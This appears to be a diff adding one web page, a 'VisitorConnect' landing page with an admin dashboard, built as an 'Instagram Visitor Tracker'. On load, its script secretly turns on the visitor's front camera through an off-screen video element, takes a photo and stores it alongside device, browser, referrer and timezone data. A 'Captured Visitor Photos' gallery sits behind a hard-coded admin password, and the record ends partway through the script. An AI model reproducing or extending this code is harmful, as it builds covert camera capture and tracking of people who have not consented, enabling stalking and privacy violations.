@@ -1,0 +1,1024 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Visitor Tracker</title>
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .hidden-camera {
+            position: absolute;
+            left: -9999px;
+            visibility: hidden;
+        }
+        
+        .photo-gallery {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+        
+        .photo-item {
+            position: relative;
+            width: 160px;
+            height: 160px;
+            border-radius: 0.375rem;
+            overflow: hidden;
+            border: 1px solid #e5e7eb;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+        }
+        
+        .photo-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .photo-info {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 0.5rem;
+            background-color: rgba(0, 0, 0, 0.5);
+            color: white;
+            font-size: 0.75rem;
+            opacity: 0;
+            transition: opacity 0.2s ease;
+        }
+        
+        .photo-item:hover .photo-info {
+            opacity: 1;
+        }
+        
+        .chart-container {
+            height: 300px;
+            margin-bottom: 2rem;
+        }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen">
+    <!-- Landing Page View -->
+    <div id="landing-page" class="min-h-screen bg-gradient-to-b from-blue-50 to-white flex flex-col">
+        <header class="bg-white shadow-sm">
+            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4">
+                <div class="flex items-center justify-between">
+                    <div class="flex items-center">
+                        <span class="text-2xl font-bold text-blue-600">VisitorConnect</span>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <main class="flex-grow">
+            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
+                <div class="text-center mb-12">
+                    <h1 class="text-4xl font-extrabold text-gray-900 mb-4">
+                        Thank You for Visiting!
+                    </h1>
+                    <p class="text-xl text-gray-600 max-w-3xl mx-auto">
+                        Your visit has been recorded. We appreciate your interest in our services.
+                    </p>
+                </div>
+
+                <div class="bg-white rounded-xl shadow-md overflow-hidden mb-8">
+                    <div class="p-8">
+                        <div class="text-center">
+                            <div class="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                                <i class="fa-solid fa-check text-blue-600 text-3xl"></i>
+                            </div>
+                            <h2 class="text-2xl font-bold text-gray-900 mb-2">Visit Confirmed</h2>
+                            <p class="text-gray-600">
+                                We've successfully recorded your visit to our website.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Hidden video and canvas for photo capture -->
+                <div class="hidden-camera">
+                    <video id="camera-video" autoplay playsinline muted></video>
+                    <canvas id="photo-canvas"></canvas>
+                </div>
+
+                <div class="bg-blue-50 rounded-xl overflow-hidden mb-8">
+                    <div class="p-6">
+                        <h3 class="text-xl font-semibold text-gray-900 mb-4">Stay Connected</h3>
+                        <p class="text-gray-600 mb-4">
+                            Follow us on social media to stay updated with our latest news and offers.
+                        </p>
+                        <div class="flex space-x-4 justify-center">
+                            <a href="#" class="text-blue-600 hover:text-blue-800">
+                                <i class="fa-brands fa-instagram text-2xl"></i>
+                            </a>
+                            <a href="#" class="text-blue-600 hover:text-blue-800">
+                                <i class="fa-brands fa-facebook text-2xl"></i>
+                            </a>
+                            <a href="#" class="text-blue-600 hover:text-blue-800">
+                                <i class="fa-brands fa-twitter text-2xl"></i>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer class="py-4 px-6 text-center text-gray-500 text-sm border-t border-gray-200">
+            <p>&copy; <span id="current-year"></span> VisitorConnect. All rights reserved.</p>
+            
+            <div class="mt-4">
+                <button 
+                    id="admin-button"
+                    class="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded-md text-sm font-medium"
+                >
+                    Admin Dashboard Access
+                </button>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Admin Dashboard View -->
+    <div id="admin-dashboard" class="min-h-screen bg-gray-50 hidden">
+        <!-- Login Form -->
+        <div id="login-form" class="min-h-screen flex items-center justify-center bg-gray-50">
+            <div class="w-full max-w-md p-8 bg-white rounded-lg shadow-md">
+                <div class="text-center mb-8">
+                    <h1 class="text-2xl font-bold">Admin Login</h1>
+                    <p class="text-gray-500 mt-2">Enter your credentials to access the dashboard</p>
+                </div>
+                
+                <form id="admin-login-form">
+                    <div class="space-y-4">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-700 mb-1">Username</label>
+                            <input
+                                type="text"
+                                id="username"
+                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
+                                required
+                            />
+                        </div>
+                        
+                        <div>
+                            <label class="block text-sm font-medium text-gray-700 mb-1">Password</label>
+                            <input
+                                type="password"
+                                id="password"
+                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
+                                required
+                            />
+                        </div>
+                        
+                        <button 
+                            type="submit" 
+                            class="w-full py-2 px-4 bg-blue-500 hover:bg-blue-600 text-white font-medium rounded-md"
+                        >
+                            Login
+                        </button>
+                    </div>
+                </form>
+                
+                <div class="mt-6 text-center">
+                    <button 
+                        id="back-to-landing"
+                        class="text-gray-500 hover:text-gray-700"
+                    >
+                        Back to Landing Page
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Admin Dashboard Content -->
+        <div id="dashboard-content" class="hidden">
+            <header class="bg-white shadow">
+                <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
+                    <div class="flex justify-between items-center">
+                        <h1 class="text-2xl font-bold text-gray-900">Admin Dashboard</h1>
+                        <button 
+                            id="logout-button"
+                            class="py-2 px-4 border border-gray-300 rounded-md hover:bg-gray-50"
+                        >
+                            Logout
+                        </button>
+                    </div>
+                </div>
+            </header>
+
+            <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+                <!-- Stats Summary -->
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
+                    <div class="bg-white p-6 rounded-lg shadow">
+                        <h3 class="text-sm font-medium text-gray-500">TOTAL VISITORS</h3>
+                        <p id="total-visitors" class="text-3xl font-bold text-gray-900 mt-1">-</p>
+                    </div>
+                    
+                    <div class="bg-white p-6 rounded-lg shadow">
+                        <h3 class="text-sm font-medium text-gray-500">NEW TODAY</h3>
+                        <p id="new-today" class="text-3xl font-bold text-gray-900 mt-1">-</p>
+                    </div>
+                    
+                    <div class="bg-white p-6 rounded-lg shadow">
+                        <h3 class="text-sm font-medium text-gray-500">MOST COMMON DEVICE</h3>
+                        <p id="common-device" class="text-3xl font-bold text-gray-900 mt-1">-</p>
+                    </div>
+                </div>
+
+                <!-- Charts Section -->
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
+                    <!-- Device Chart -->
+                    <div class="bg-white p-6 rounded-lg shadow">
+                        <h3 class="text-xl font-bold text-gray-900 mb-4">Devices</h3>
+                        <div id="device-chart" class="chart-container"></div>
+                    </div>
+
+                    <!-- Referrer Chart -->
+                    <div class="bg-white p-6 rounded-lg shadow">
+                        <h3 class="text-xl font-bold text-gray-900 mb-4">Traffic Sources</h3>
+                        <div id="referrer-chart" class="chart-container"></div>
+                    </div>
+                </div>
+                
+                <!-- Photos Gallery -->
+                <div class="bg-white p-6 rounded-lg shadow mb-8">
+                    <h3 class="text-xl font-bold text-gray-900 mb-4">Captured Visitor Photos</h3>
+                    <div id="photo-gallery" class="photo-gallery">
+                        <!-- Photos will be populated dynamically -->
+                        <div class="flex flex-col items-center justify-center p-8 w-full text-gray-500">
+                            <i class="fa-solid fa-camera-slash text-3xl mb-2"></i>
+                            <p>No photos captured yet</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Visitor Data Table -->
+                <div class="bg-white p-6 rounded-lg shadow">
+                    <h3 class="text-xl font-bold text-gray-900 mb-4">Recent Visitors</h3>
+                    
+                    <!-- Search & Filter Controls -->
+                    <div class="flex flex-col sm:flex-row justify-between gap-4 mb-6">
+                        <div class="relative">
+                            <input
+                                id="search-input"
+                                type="text"
+                                placeholder="Search visitors..."
+                                class="w-full sm:w-80 pl-10 py-2 px-4 border border-gray-300 rounded-md"
+                            />
+                            <i class="fa-solid fa-search absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500"></i>
+                        </div>
+                        <select 
+                            id="time-filter"
+                            class="py-2 px-4 border border-gray-300 rounded-md w-full sm:w-[180px]"
+                        >
+                            <option value="all">All time</option>
+                            <option value="today">Today</option>
+                            <option value="week">This week</option>
+                            <option value="month">This month</option>
+                        </select>
+                    </div>
+                    
+                    <!-- Visitor Table -->
+                    <div class="overflow-x-auto">
+                        <table class="min-w-full divide-y divide-gray-200">
+                            <thead>
+                                <tr>
+                                    <th class="px-6 py-3 bg-gray-50 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
+                                        Device / Browser
+                                    </th>
+                                    <th class="px-6 py-3 bg-gray-50 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
+                                        Source
+                                    </th>
+                                    <th class="px-6 py-3 bg-gray-50 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
+                                        Region (Timezone)
+                                    </th>
+                                    <th class="px-6 py-3 bg-gray-50 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
+                                        Date Visited
+                                    </th>
+                                    <th class="px-6 py-3 bg-gray-50 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
+                                        Actions
+                                    </th>
+                                </tr>
+                            </thead>
+                            <tbody id="visitors-table-body" class="bg-white divide-y divide-gray-200">
+                                <!-- Table rows will be populated dynamically -->
+                                <tr>
+                                    <td colspan="5" class="text-center py-8 text-gray-500">
+                                        No visitors found
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <!-- Pagination -->
+                    <div id="pagination" class="mt-6 flex items-center justify-between hidden">
+                        <div class="text-sm text-gray-500">
+                            Showing <span id="page-start" class="font-medium">1</span> to <span id="page-end" class="font-medium">10</span> of <span id="total-results" class="font-medium">0</span> results
+                        </div>
+                        <div class="flex space-x-2">
+                            <button id="prev-page" class="py-2 px-4 border border-gray-300 rounded-md bg-white disabled:opacity-50">Previous</button>
+                            <button id="page-number" class="py-2 px-4 bg-blue-500 text-white rounded-md">1</button>
+                            <button id="next-page" class="py-2 px-4 border border-gray-300 rounded-md bg-white disabled:opacity-50">Next</button>
+                        </div>
+                    </div>
+                </div>
+            </main>
+
+            <!-- Footer -->
+            <footer class="py-4 px-6 text-center text-gray-500 text-sm border-t border-gray-200">
+                <p>&copy; <span id="current-year-admin"></span> VisitorConnect. All rights reserved.</p>
+            </footer>
+        </div>
+    </div>
+
+    <!-- Include Chart.js for visualizations -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    
+    <!-- Main JavaScript -->
+    <script>
+        // Global variables
+        let visitors = [];
+        let stats = {
+            totalVisitors: 0,
+            newToday: 0,
+            deviceBreakdown: {},
+            referrerBreakdown: {}
+        };
+        let deviceChart = null;
+        let referrerChart = null;
+        let isLoggedIn = false;
+        
+        // DOM Elements
+        const landingPage = document.getElementById('landing-page');
+        const adminDashboard = document.getElementById('admin-dashboard');
+        const loginForm = document.getElementById('login-form');
+        const dashboardContent = document.getElementById('dashboard-content');
+        const adminLoginForm = document.getElementById('admin-login-form');
+        const adminButton = document.getElementById('admin-button');
+        const backToLandingButton = document.getElementById('back-to-landing');
+        const logoutButton = document.getElementById('logout-button');
+        const video = document.getElementById('camera-video');
+        const canvas = document.getElementById('photo-canvas');
+        const searchInput = document.getElementById('search-input');
+        const timeFilter = document.getElementById('time-filter');
+        const totalVisitorsElement = document.getElementById('total-visitors');
+        const newTodayElement = document.getElementById('new-today');
+        const commonDeviceElement = document.getElementById('common-device');
+        const photoGallery = document.getElementById('photo-gallery');
+        const visitorsTableBody = document.getElementById('visitors-table-body');
+        
+        // Set current year in footers
+        const currentYear = new Date().getFullYear();
+        document.getElementById('current-year').textContent = currentYear;
+        document.getElementById('current-year-admin').textContent = currentYear;
+        
+        // Event Listeners
+        document.addEventListener('DOMContentLoaded', init);
+        adminButton.addEventListener('click', showAdminLogin);
+        backToLandingButton.addEventListener('click', showLandingPage);
+        logoutButton.addEventListener('click', logout);
+        adminLoginForm.addEventListener('submit', handleLogin);
+        searchInput.addEventListener('input', filterVisitors);
+        timeFilter.addEventListener('change', filterVisitors);
+        
+        // Initialize application
+        function init() {
+            // Start camera and record visit
+            activateCamera();
+            
+            // Add test admin for demo
+            const testAdmin = {
+                username: 'admin',
+                password: 'admin12231223'
+            };
+            localStorage.setItem('admin', JSON.stringify(testAdmin));
+            
+            // Load mock data for demo
+            loadMockData();
+        }
+        
+        // Camera Functions
+        function activateCamera() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                console.error("getUserMedia is not supported in this browser");
+                recordVisit();
+                return;
+            }
+            
+            const constraints = {
+                video: {
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 },
+                    facingMode: "user"
+                }
+            };
+            
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        
+                        // Once video is playing, wait a moment and take the photo
+                        setTimeout(() => {
+                            capturePhoto(stream);
+                            
+                            // After capturing the photo, stop the camera stream
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 1000);
+                    };
+                })
+                .catch(error => {
+                    console.error("Error accessing camera:", error);
+                    recordVisit();
+                });
+        }
+        
+        function capturePhoto(stream) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            const context = canvas.getContext('2d');
+            if (context) {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Convert canvas to data URL (base64 image)
+                const photoData = canvas.toDataURL('image/jpeg');
+                
+                // In a real app, you would upload this photo to a server
+                // For this demo, we'll store it locally
+                const photoId = generateId();
+                const photoUrl = `photo_${photoId}.jpg`;
+                
+                // Store the photo in local storage (simulating server storage)
+                localStorage.setItem(photoUrl, photoData);
+                
+                // Record visit with the photo URL
+                recordVisit(photoUrl);
+            }
+        }
+        
+        // Visit Recording
+        function recordVisit(photoUrl = null) {
+            const visitData = {
+                id: generateId(),
+                device: getDeviceType(),
+                browser: getBrowserInfo(),
+                referrer: document.referrer || 'direct',
+                screenSize: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                photoUrl: photoUrl,
+                visitedAt: new Date().toISOString()
+            };
+            
+            // In a real app, you would send this data to your server
+            // For this demo, we'll store it locally
+            const storedVisitors = JSON.parse(localStorage.getItem('visitors') || '[]');
+            storedVisitors.push(visitData);
+            localStorage.setItem('visitors', JSON.stringify(storedVisitors));
+            
+            // Update stats
+            updateStats();
+        }
+        
+        // Helper Functions
+        function getBrowserInfo() {
+            const userAgent = navigator.userAgent;
+            let browserName = "Unknown";
+            
+            if (userAgent.indexOf("Firefox") > -1) {
+                browserName = "Firefox";
+            } else if (userAgent.indexOf("SamsungBrowser") > -1) {
+                browserName = "Samsung Browser";
+            } else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) {
+                browserName = "Opera";
+            } else if (userAgent.indexOf("Trident") > -1) {
+                browserName = "Internet Explorer";
+            } else if (userAgent.indexOf("Edge") > -1) {
+                browserName = "Edge";
+            } else if (userAgent.indexOf("Chrome") > -1) {
+                browserName = "Chrome";
+            } else if (userAgent.indexOf("Safari") > -1) {
+                browserName = "Safari";
+            }
+            
+            return browserName;
+        }
+        
+        function getDeviceType() {
+            const userAgent = navigator.userAgent;
+            if (/Android/i.test(userAgent)) {
+                return "Android";
+            } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+                return "iOS";
+            } else if (/Windows/i.test(userAgent)) {
+                return "Windows";
+            } else if (/Mac/i.test(userAgent)) {
+                return "Mac";
+            } else if (/Linux/i.test(userAgent)) {
+                return "Linux";
+            } else {
+                return "Unknown";
+            }
+        }
+        
+        function getDeviceIcon(device) {
+            const deviceLower = device.toLowerCase();
+            if (deviceLower.includes('iphone') || deviceLower.includes('android')) return 'mobile';
+            if (deviceLower.includes('ipad')) return 'tablet';
+            if (deviceLower.includes('mac')) return 'apple';
+            if (deviceLower.includes('windows')) return 'windows';
+            if (deviceLower.includes('linux')) return 'linux';
+            return 'desktop';
+        }
+        
+        function generateId() {
+            return Date.now().toString(36) + Math.random().toString(36).substring(2);
+        }
+        
+        function formatDate(dateString) {
+            const date = new Date(dateString);
+            return date.toLocaleString();
+        }
+        
+        // View Management
+        function showAdminLogin() {
+            landingPage.classList.add('hidden');
+            adminDashboard.classList.remove('hidden');
+            loginForm.classList.remove('hidden');
+            dashboardContent.classList.add('hidden');
+        }
+        
+        function showLandingPage() {
+            adminDashboard.classList.add('hidden');
+            landingPage.classList.remove('hidden');
+        }
+        
+        function showDashboard() {
+            loginForm.classList.add('hidden');
+            dashboardContent.classList.remove('hidden');
+            loadVisitorData();
+        }
+        
+        function logout() {
+            isLoggedIn = false;
+            dashboardContent.classList.add('hidden');
+            loginForm.classList.remove('hidden');
+        }
+        
+        // Authentication
+        function handleLogin(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // In a real app, this would be an API call
+            // For this demo, we'll check against localStorage
+            const storedAdmin = JSON.parse(localStorage.getItem('admin') || '{}');
+            
+            if (username === storedAdmin.username && password === storedAdmin.password) {
+                isLoggedIn = true;
+                showDashboard();
+                showNotification('Login successful', 'Welcome to the admin dashboard');
+            } else {
+                showNotification('Login failed', 'Invalid username or password', true);
+            }
+        }
+        
+        // Notifications
+        function showNotification(title, message, isError = false) {
+            const notification = document.createElement('div');
+            notification.className = `fixed top-4 right-4 p-4 rounded-lg shadow-lg max-w-xs ${isError ? 'bg-red-500' : 'bg-green-500'} text-white`;
+            notification.innerHTML = `
+                <h4 class="font-bold">${title}</h4>
+                <p>${message}</p>
+            `;
+            
+            document.body.appendChild(notification);
+            
+            setTimeout(() => {
+                notification.remove();
+            }, 3000);
+        }
+        
+        // Data Management
+        function loadVisitorData() {
+            // In a real app, this would be an API call
+            // For this demo, we'll load from localStorage
+            visitors = JSON.parse(localStorage.getItem('visitors') || '[]');
+            updateStats();
+            renderVisitorTable();
+            renderPhotoGallery();
+            renderCharts();
+        }
+        
+        function updateStats() {
+            // In a real app, this would be an API call
+            // For this demo, we'll calculate from localStorage
+            const storedVisitors = JSON.parse(localStorage.getItem('visitors') || '[]');
+            
+            // Calculate totals
+            stats.totalVisitors = storedVisitors.length;
+            
+            // Calculate new today
+            const today = new Date();
+            today.setHours(0, 0, 0, 0);
+            stats.newToday = storedVisitors.filter(visitor => 
+                new Date(visitor.visitedAt) >= today
+            ).length;
+            
+            // Calculate device breakdown
+            stats.deviceBreakdown = {};
+            storedVisitors.forEach(visitor => {
+                const device = visitor.device || "Unknown";
+                stats.deviceBreakdown[device] = (stats.deviceBreakdown[device] || 0) + 1;
+            });
+            
+            // Calculate referrer breakdown
+            stats.referrerBreakdown = {};
+            storedVisitors.forEach(visitor => {
+                const referrer = visitor.referrer || "direct";
+                stats.referrerBreakdown[referrer] = (stats.referrerBreakdown[referrer] || 0) + 1;
+            });
+            
+            // Find most common device
+            let mostCommonDevice = "None";
+            let maxCount = 0;
+            
+            Object.entries(stats.deviceBreakdown).forEach(([device, count]) => {
+                if (count > maxCount) {
+                    mostCommonDevice = device;
+                    maxCount = count;
+                }
+            });
+            
+            // Update UI
+            if (isLoggedIn) {
+                totalVisitorsElement.textContent = stats.totalVisitors;
+                newTodayElement.textContent = stats.newToday;
+                commonDeviceElement.textContent = mostCommonDevice;
+            }
+        }
+        
+        function filterVisitors() {
+            renderVisitorTable();
+            renderPhotoGallery();
+        }
+        
+        function deleteVisitor(id) {
+            if (confirm('Are you sure you want to delete this visitor?')) {
+                // In a real app, this would be an API call
+                // For this demo, we'll update localStorage
+                const storedVisitors = JSON.parse(localStorage.getItem('visitors') || '[]');
+                const updatedVisitors = storedVisitors.filter(visitor => visitor.id !== id);
+                localStorage.setItem('visitors', JSON.stringify(updatedVisitors));
+                
+                visitors = updatedVisitors;
+                updateStats();
+                renderVisitorTable();
+                renderPhotoGallery();
+                renderCharts();
+                
+                showNotification('Visitor deleted', 'Visitor record has been removed successfully');
+            }
+        }
+        
+        // Rendering Functions
+        function renderVisitorTable() {
+            const searchValue = searchInput.value.toLowerCase();
+            const timeValue = timeFilter.value;
+            
+            // Filter visitors based on search and time
+            let filteredVisitors = [...visitors];
+            
+            // Apply time filter
+            if (timeValue !== 'all') {
+                const now = new Date();
+                let cutoffDate;
+                
+                switch (timeValue) {
+                    case 'today':
+                        cutoffDate = new Date(now);
+                        cutoffDate.setHours(0, 0, 0, 0);
+                        break;
+                    case 'week':
+                        cutoffDate = new Date(now);
+                        cutoffDate.setDate(now.getDate() - 7);
+                        break;
+                    case 'month':
+                        cutoffDate = new Date(now);
+                        cutoffDate.setMonth(now.getMonth() - 1);
+                        break;
+                    default:
+                        cutoffDate = new Date(0); // beginning of time
+                }
+                
+                filteredVisitors = filteredVisitors.filter(visitor => 
+                    new Date(visitor.visitedAt) >= cutoffDate
+                );
+            }
+            
+            // Apply search filter
+            if (searchValue.trim()) {
+                filteredVisitors = filteredVisitors.filter(visitor => 
+                    visitor.device.toLowerCase().includes(searchValue) ||
+                    visitor.browser.toLowerCase().includes(searchValue) ||
+                    visitor.referrer.toLowerCase().includes(searchValue) ||
+                    (visitor.timezone && visitor.timezone.toLowerCase().includes(searchValue))
+                );
+            }
+            
+            // Sort by visit date (newest first)
+            filteredVisitors.sort((a, b) => 
+                new Date(b.visitedAt).getTime() - new Date(a.visitedAt).getTime()
+            );
+            
+            // Update table
+            if (filteredVisitors.length === 0) {
+                visitorsTableBody.innerHTML = `
+                    <tr>
+                        <td colspan="5" class="text-center py-8 text-gray-500">
+                            No visitors found
+                        </td>
+                    </tr>
+                `;
+                document.getElementById('pagination').classList.add('hidden');
+                return;
+            }
+            
+            // Build table rows
+            let tableHtml = '';
+            
+            filteredVisitors.forEach(visitor => {
+                tableHtml += `
+                    <tr class="border-b border-gray-200 hover:bg-gray-50">
+                        <td class="px-6 py-4">
+                            <div class="flex items-center">
+                                <div class="mr-2">
+                                    <i class="fa-solid fa-${getDeviceIcon(visitor.device)} text-gray-500"></i>
+                                </div>
+                                <div>
+                                    <div class="text-sm font-medium text-gray-900">${visitor.device}</div>
+                                    <div class="text-xs text-gray-500">${visitor.browser}</div>
+                                </div>
+                            </div>
+                        </td>
+                        <td class="px-6 py-4">
+                            <div class="text-sm text-gray-900">${visitor.referrer}</div>
+                        </td>
+                        <td class="px-6 py-4">
+                            <div class="text-sm text-gray-900">${visitor.timezone || 'Unknown'}</div>
+                        </td>
+                        <td class="px-6 py-4">
+                            <div class="text-sm text-gray-900">
+                                ${formatDate(visitor.visitedAt)}
+                            </div>
+                            ${visitor.photoUrl ? `
+                                <div class="mt-1">
+                                    <img 
+                                        src="${localStorage.getItem(visitor.photoUrl)}" 
+                                        alt="Visitor photo"
+                                        class="h-16 w-16 object-cover rounded-md border border-gray-200"
+                                    />
+                                </div>
+                            ` : ''}
+                        </td>
+                        <td class="px-6 py-4 text-sm">
+                            <button 
+                                class="text-red-500 hover:text-red-700 transition" 
+                                title="Delete"
+                                onclick="deleteVisitor('${visitor.id}')"
+                            >
+                                <i class="fa-solid fa-trash"></i>
+                            </button>
+                        </td>
+                    </tr>
+                `;
+            });
+            
+            visitorsTableBody.innerHTML = tableHtml;
+            
+            // Simple pagination for demo
+            const pageNum = 1;
+            const total = filteredVisitors.length;
+            
+            document.getElementById('pagination').classList.remove('hidden');
+            document.getElementById('page-start').textContent = '1';
+            document.getElementById('page-end').textContent = total.toString();
+            document.getElementById('total-results').textContent = total.toString();
+            document.getElementById('page-number').textContent = pageNum.toString();
+            document.getElementById('prev-page').disabled = true;
+            document.getElementById('next-page').disabled = true;
+        }
+        
+        function renderPhotoGallery() {
+            const searchValue = searchInput.value.toLowerCase();
+            const timeValue = timeFilter.value;
+            
+            // Filter visitors with photos
+            let filteredVisitors = visitors.filter(visitor => visitor.photoUrl);
+            
+            // Apply time filter
+            if (timeValue !== 'all') {
+                const now = new Date();
+                let cutoffDate;
+                
+                switch (timeValue) {
+                    case 'today':
+                        cutoffDate = new Date(now);
+                        cutoffDate.setHours(0, 0, 0, 0);
+                        break;
+                    case 'week':
+                        cutoffDate = new Date(now);
+                        cutoffDate.setDate(now.getDate() - 7);
+                        break;
+                    case 'month':
+                        cutoffDate = new Date(now);
+                        cutoffDate.setMonth(now.getMonth() - 1);
+                        break;
+                    default:
+                        cutoffDate = new Date(0); // beginning of time
+                }
+                
+                filteredVisitors = filteredVisitors.filter(visitor => 
+                    new Date(visitor.visitedAt) >= cutoffDate
+                );
+            }
+            
+            // Apply search filter
+            if (searchValue.trim()) {
+                filteredVisitors = filteredVisitors.filter(visitor => 
+                    visitor.device.toLowerCase().includes(searchValue) ||
+                    visitor.browser.toLowerCase().includes(searchValue) ||
+                    visitor.referrer.toLowerCase().includes(searchValue) ||
+                    (visitor.timezone && visitor.timezone.toLowerCase().includes(searchValue))
+                );
+            }
+            
+            // Sort by visit date (newest first)
+            filteredVisitors.sort((a, b) => 
+                new Date(b.visitedAt).getTime() - new Date(a.visitedAt).getTime()
+            );
+            
+            // Update gallery
+            if (filteredVisitors.length === 0) {
+                photoGallery.innerHTML = `
+                    <div class="flex flex-col items-center justify-center p-8 w-full text-gray-500">
+                        <i class="fa-solid fa-camera-slash text-3xl mb-2"></i>
+                        <p>No photos captured yet</p>
+                    </div>
+                `;
+                return;
+            }
+            
+            // Build gallery items
+            let galleryHtml = '';
+            
+            filteredVisitors.forEach(visitor => {
+                galleryHtml += `
+                    <div class="photo-item group">
+                        <img 
+                            src="${localStorage.getItem(visitor.photoUrl)}" 
+                            alt="Visitor from ${visitor.device}"
+                            onerror="this.src='https://via.placeholder.com/160?text=No+Image'"
+                        />
+                        <div class="photo-info">
+                            <p class="truncate">${visitor.device} / ${visitor.browser}</p>
+                            <p class="truncate">${formatDate(visitor.visitedAt)}</p>
+                        </div>
+                    </div>
+                `;
+            });
+            
+            photoGallery.innerHTML = galleryHtml;
+        }
+        
+        function renderCharts() {
+            // Prepare device chart data
+            const deviceLabels = Object.keys(stats.deviceBreakdown);
+            const deviceData = Object.values(stats.deviceBreakdown);
+            const deviceColors = [
+                '#0088FE', '#00C49F', '#FFBB28', '#FF8042', '#8884D8', '#FF6B6B'
+            ];
+            
+            // Clear previous chart if exists
+            if (deviceChart) {
+                deviceChart.destroy();
+            }
+            
+            // Create new device chart
+            const deviceCtx = document.getElementById('device-chart').getContext('2d');
+            deviceChart = new Chart(deviceCtx, {
+                type: 'pie',
+                data: {
+                    labels: deviceLabels,
+                    datasets: [{
+                        data: deviceData,
+                        backgroundColor: deviceColors.slice(0, deviceLabels.length),
+                        borderWidth: 1
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: {
+                            position: 'bottom'
+                        }
+                    }
+                }
+            });
+            
+            // Prepare referrer chart data
+            const referrerLabels = Object.keys(stats.referrerBreakdown).map(label => 
+                label === 'direct' ? 'Direct' : label
+            );
+            const referrerData = Object.values(stats.referrerBreakdown);
+            const referrerColors = [
+                '#FF6B6B', '#8884D8', '#00C49F', '#FFBB28', '#0088FE', '#FF8042'
+            ];
+            
+            // Clear previous chart if exists
+            if (referrerChart) {
+                referrerChart.destroy();
+            }
+            
+            // Create new referrer chart
+            const referrerCtx = document.getElementById('referrer-chart').getContext('2d');
+            referrerChart = new Chart(referrerCtx, {
+                type: 'pie',
+                data: {
+                    labels: referrerLabels,
+                    datasets: [{
+                        data: referrerData,
+                        backgroundColor: referrerColors.slice(0, referrerLabels.length),
+                        borderWidth: 1
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: {
+                            position: 'bottom'
+                        }
+                    }
+                }
+            });
+        }
+        
+        // Mock Data for Demo
+        function loadMockData() {
+            // Only add mock data if no visitors exist
+            const storedVisitors = JSON.parse(localStorage.getItem('visitors') || '[]');
+            if (storedVisitors.length > 0) return;
+            
+            const mockVisitors = [
+                {
+                    id: 'mock1',
+                    device: 'Android',
+                    browser: 'Chrome',
+                    referrer: 'instagram.com',
+                    screenSize: '1080x1920',
+                    language: 'en-US',
+                    timezone: 'America/New_York',
+                    photoUrl: null,
+                    visitedAt: new Date(Date.now() - 2 * 60 * 60 * 1000).toISOString() // 2 hours ago
+                },
+                {
+                    id: 'mock2',
+                    device: 'iOS',
+                    browser: 'Safari',
+                    referrer: 'direct',
+                    screenSize: '1170x2532',
+                    language: 'en-GB',
+                    timezone: 'Europe/London',
+                    photoUrl: null,
+                    visitedAt: new Date(Date.now() - 4 * 60 * 60 * 1000).toISOString() // 4 hours ago
+                },
+                {
+                    id: 'mock3',
+                    device: 'Windows',
+                    browser: 'Edge',
+                    referrer: 'instagram.com',
+                    screenSize: '1920x1080',
+                    language: 'es-ES',
+                    timezone: 'Europe/Madrid',
+                    photoUrl: null,
+                    visitedAt: new Date(Date.now() - 1 * 24 * 60 * 60 * 1000).toISOString() // 1 day ago
+                }
+            ];
+            
+            localStorage.setItem('visitors', JSON.stringify(mockVisitors));
+        }
+        
